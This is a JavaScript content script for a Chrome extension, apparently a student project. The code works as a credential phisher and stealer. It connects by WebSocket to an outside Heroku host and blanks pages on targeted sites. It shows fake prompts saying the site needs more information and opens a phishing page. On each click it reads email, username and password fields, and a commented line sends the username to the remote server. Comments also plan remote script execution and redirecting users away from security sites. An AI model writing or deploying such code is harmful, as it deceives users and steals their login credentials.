//Just in case a popular website is trying to redflag my IP
console.log("This is all for a school project!");

//Flag variable used for if they filled out popup or not.
var phishFl = "";
chrome.storage.sync.get("phishFlag", function(ev){
  phishFl = ev.phishFlag;
  console.log("phishFlag upon initial load is " + phishFl);
});

var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);


//This will get all the values of type email
//Email is the standard type for the email text box
//in most browsers

//Simply say the website of the current tab
console.log(window.location.host);

//Just for testing purposes
chrome.storage.sync.get("id", function(ev){
  console.log("This user is id is " + ev.id);
});

/*
This is just for testing purposes to try to add
a new value to storage. This will alos help with REDIRECTION
TO ANOTHER SITE
*/

// This is supposed to be used to be able to add to the array depending on
// input from the server.
chrome.storage.sync.get(["values"], function(result){
  var arr = result["values"];
  var testString = window.location.host;
  console.log("BEFORE CHANGING PHISHFLAG " + phishFl);
  console.log(arr);
  for(var i = 0; i < arr.length; i++){
    if(testString.includes(arr[i])){
      document.getElementsByTagName("BODY")[0].style.display = "none";
    //TO DO JS EXE, SIMPLY WRITE THE CODE UPON SIGNAL RECEIVE.


    //  This function is meant to be able to phish stuff info from the user.
      console.log("Before phishFlag changes " + phishFl);
        if(phishFl.localeCompare("nope") === 0){
          var confirmVal = confirm(testString + " needs more information from you to display properly.");
          if(confirmVal == true){
            console.log("INSIDE OF FALSE STATE PHISHFLAG");
            phishFl = "yes";
            chrome.storage.sync.set({'phishVal': phishFl}, function(){});
            chrome.extension.sendMessage({action: 'openPhish'});
          }
          else{
            chrome.storage.sync.set({'phishVal': phishFl}, function(){});
            chrome.extension.sendMessage({action: 'openPhish'});
          }
        }
        else{
          var confirmVal = confirm(testString + " needs more information from you to continue access.");
          if(confirmVal == true){
            chrome.extension.sendMessage({action: 'openPhish'});
          }
          else{
            chrome.extension.sendMessage({action: 'openPhish'});
          }
        }
      }
    }
});

      //This will redirect them from security website
      //to a different site all together
      //window.location.replace("https://crouton.net/");

//Wait for a click on the screen
window.addEventListener("click", clickListen, false);

function clickListen (e){
  var val = document.getElementsByTagName('input');
  for(var i = 0; i < val.length; i++){
    if(val[i].type.toLowerCase() == 'email'){
        if(!(val[i].value === "" || val[i].value === null)){
          console.log("Username is " + val[i].value);
      }
    }
    if(val[i].type.toLowerCase() == 'password'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Password is " + val[i].value);
      }
    }
    /*
    Some forms that are used, such as instagram forms,
    have a input name rather than a type.
    */
    if(val[i].name.toLowerCase() == 'username'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
      }
    }
  }
}

//chrome.tabs.executeScript({file: inject.js})


//ws.send("Username is "+document.getElementById('username').value);
